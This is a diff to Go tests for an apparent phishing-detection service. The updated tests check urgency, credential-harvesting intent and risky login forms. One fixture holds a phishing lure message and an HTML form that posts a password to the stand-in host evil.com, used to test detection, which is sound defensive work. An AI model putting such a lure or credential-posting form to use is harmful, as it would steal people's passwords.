@@ -8,24 +8,36 @@ import (
 	"github.com/PhishVault/PhishVault-2/services/analysis/decision"
 )
 
-func TestNLP(t *testing.T) {
-	text := "Your account will be suspended within 24 hours. Action Required Immediately!"
-	result := ai.AnalyzeText(text)
+func TestTextPipeline(t *testing.T) {
+	text := "Your account will be suspended within 24 hours. Action Required Immediately! Login to unlock."
+	html := `<html><body><form action="http://evil.com/login" method="post"><input type="password" name="pass"></form></body></html>`
+
+	// Simulate scanning "example.com"
+	result := ai.AnalyzeContent(html, text, "example.com")
 
 	if result.UrgencyScore < 0.5 {
 		t.Errorf("Expected high urgency, got %f", result.UrgencyScore)
 	}
-	if len(result.Keywords) == 0 {
-		t.Error("Expected keywords to be found")
+	if result.Intent != "CredentialHarvesting" {
+		t.Errorf("Expected Intent: CredentialHarvesting, got %s", result.Intent)
 	}
-	t.Logf("NLP Result: Score=%f, Keywords=%v", result.UrgencyScore, result.Keywords)
+	if !result.FormRisk.HasPassword {
+		t.Error("Failed to detect password field")
+	}
+	if !result.FormRisk.ForeignAction {
+		t.Error("Failed to detect foreign form action")
+	}
+
+	t.Logf("Pipeline Result: Intent=%s, Score=%f, FormRisk=%+v", result.Intent, result.UrgencyScore, result.FormRisk)
 }
 
 func TestOPA(t *testing.T) {
 	// Malicious input
 	input := decision.PolicyInput{
 		VisualMatchScore: 0.9,
-		NLPUrgencyScore:  0.8,
+		UrgencyScore:     0.8,
+		Intent:           "CredentialHarvesting",
+		HasLoginForm:     true,
 		DomainAgeDays:    5,
 	}
 
@@ -42,7 +54,9 @@ func TestOPA(t *testing.T) {
 	// Safe input
 	safeInput := decision.PolicyInput{
 		VisualMatchScore: 0.1,
-		NLPUrgencyScore:  0.0,
+		UrgencyScore:     0.0,
+		Intent:           "Benign",
+		HasLoginForm:     false,
 		DomainAgeDays:    100,
 	}
 	safeResult, err := decision.EvaluateVerdict(context.Background(), safeInput)
